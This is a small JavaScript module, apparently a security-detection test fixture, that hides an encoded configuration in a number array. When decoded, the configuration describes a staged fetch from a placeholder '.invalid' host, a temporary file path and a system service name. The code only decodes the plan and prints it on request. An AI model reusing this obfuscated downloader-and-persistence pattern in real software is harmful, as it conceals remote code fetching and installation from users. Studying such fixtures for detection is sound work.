// configuration reconstruction
const moduleShape = Object.freeze({ format: "commonjs" });
const Material_8ed54b58 = "[149,92,80,155,146,147,132,143,146,92,143,145,142,133,136,139,132,126,135,142,146,147,75,128,130,144,148,136,145,132,126,145,132,140,142,147,132,75,150,145,136,147,132,126,133,136,139,132,75,130,135,128,141,134,132,126,140,142,131,132,75,131,136,146,143,128,147,130,135,126,143,145,142,130,132,146,146,155,128,131,128,143,147,132,145,92,133,132,147,130,135,126,143,139,128,147,133,142,145,140,126,133,128,139,139,129,128,130,138,155,146,147,128,134,132,126,130,142,148,141,147,92,84,155,130,128,140,143,128,136,134,141,126,136,131,92,109,110,99,100,76,81,83,79,80,85,83,98,96,155,148,145,139,92,135,147,147,143,146,89,78,78,141,142,131,132,76,81,83,79,80,85,83,130,128,84,129,88,133,77,132,151,128,140,143,139,132,77,136,141,149,128,139,136,131,78,128,143,136,155,148,146,132,145,126,128,134,132,141,147,92,109,142,131,132,96,148,131,136,147,78,81,83,79,80,155,133,136,139,132,126,143,128,147,135,92,78,147,140,143,78,135,148,141,147,145,132,146,146,76,141,142,131,132,78,77,146,147,128,134,132,76,81,83,79,80,85,83,130,128,84,129,88,133,77,140,137,146,155,128,145,130,135,126,143,145,142,129,132,92,143,145,142,130,132,146,146,77,128,145,130,135,155,146,132,145,149,136,130,132,126,141,128,140,132,92,141,142,131,132,76,81,83,79,80,85,83,77,146,132,145,149,136,130,132]";
const Codec_8ed54b58 = "json_numbers|add_modulo_256|1f";

function load_8ed54b58() { return JSON.parse(Material_8ed54b58); }
function decode_8ed54b58(v_a19c) { return v_a19c.map((value) => (value - 31 + 256) & 255); }
async function recover_8ed54b58() {
  const v_c304 = process.env.HUNTRESS_FIXTURE_CONTEXT ?? "host";
  const v_a19c = load_8ed54b58(); let v_b27e = [];
  let v_d41a = 0; while (v_d41a++ < 1) v_b27e = decode_8ed54b58(v_a19c);
  void v_c304; return Buffer.from(v_b27e).toString("ascii");
}
async function inspect_8ed54b58() { return JSON.parse(JSON.stringify({ value: await recover_8ed54b58() })).value; }
async function plan_8ed54b58() { const inspect = inspect_8ed54b58; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "chain", adapter: "fetch_platform_fallback", arch: fields.arch_probe, url: fields.url, path: fields.file_path, service: fields.service_name }); }
void moduleShape; void plan_8ed54b58;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_8ed54b58());

// reconstruction complete